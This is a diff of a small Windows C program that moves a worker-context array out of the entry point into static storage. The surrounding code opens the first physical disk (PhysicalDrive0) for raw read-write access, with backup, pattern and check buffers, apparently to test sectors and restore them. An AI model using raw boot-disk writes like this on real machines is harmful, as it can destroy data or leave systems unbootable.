@@ -17,6 +17,7 @@ static int same(const unsigned char *a,const unsigned char *b) {
     DWORD i; for(i=0;i<BYTES;++i) if(a[i]!=b[i]) return 0; return 1;
 }
 struct worker_ctx { DWORD index; unsigned char original[512]; int ok; };
+static struct worker_ctx ctx[8];
 static DWORD WINAPI worker(void *context) {
     struct worker_ctx *w=(struct worker_ctx *)context;
     HANDLE h=INVALID_HANDLE_VALUE; unsigned char *pattern=NULL,*check=NULL;
@@ -48,7 +49,7 @@ done:
 }
 void mainCRTStartup(void) {
     HANDLE h=INVALID_HANDLE_VALUE, backup=INVALID_HANDLE_VALUE, threads[8]={0};
-    unsigned char *original=NULL,*check=NULL; struct worker_ctx ctx[8]={0};
+    unsigned char *original=NULL,*check=NULL;
     GET_LENGTH_INFORMATION length; DWORD n=0,i,j,started=0; int ok=0;
     h=CreateFileW(L"\\\\.\\PhysicalDrive0",GENERIC_READ|GENERIC_WRITE,
         FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_FLAG_NO_BUFFERING,NULL);
